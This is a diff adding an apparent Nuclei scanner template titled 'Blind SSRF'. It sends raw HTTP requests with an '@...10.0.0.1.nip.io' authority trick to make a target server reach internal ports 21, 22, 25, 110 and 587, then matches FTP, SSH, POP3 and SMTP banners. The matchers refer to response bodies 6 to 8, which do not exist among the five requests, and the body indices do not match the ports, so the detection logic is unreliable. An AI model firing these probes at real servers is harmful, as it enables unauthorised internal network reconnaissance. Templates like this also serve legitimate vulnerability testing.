@@ -1,0 +1,59 @@
+id: 0x176
+
+info:
+  name: Blind SSRF
+  author: reewardius
+  severity: high
+  tags: ssrf
+  
+http:
+  - raw:
+      - |
+        GET @customer1.app.10.0.0.1.nip.io:21 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Cache-Control: no-transform
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        
+      - |
+        GET @customer1.app.10.0.0.1.nip.io:22 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Cache-Control: no-transform
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        
+      - |
+        GET @customer1.app.10.0.0.1.nip.io:25 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Cache-Control: no-transform
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        
+      - |
+        GET @customer1.app.10.0.0.1.nip.io:110 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Cache-Control: no-transform
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        
+      - |
+        GET @customer1.app.10.0.0.1.nip.io:587 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Cache-Control: no-transform
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        
+    unsafe: true
+    matchers:
+      - type: dsl
+        condition: or
+        dsl:
+          - (!regex("(?i)FTP",body_1)) && (!regex("(?i)FTP",body_2)) && (regex("(?i)FTP",body_3))
+          - (!regex("(?i)SSH-[.]+-+",body_1)) && (!regex("(?i)SSH-[.]+-+",body_2)) && (regex("(?i)SSH-[.]+-+",body_4))
+          - (!regex("(?i)POP3",body_1)) && (!regex("(?i)POP3",body_2)) && (regex("(?i)POP3",body_6))
+          - (!regex("(?i)SMTP",body_1)) && (!regex("(?i)SMTP",body_2)) && ((regex("(?i)SMTP",body_5)) || (regex("(?i)SMTP",body_7)) || (regex("(?i)SMTP",body_8)))
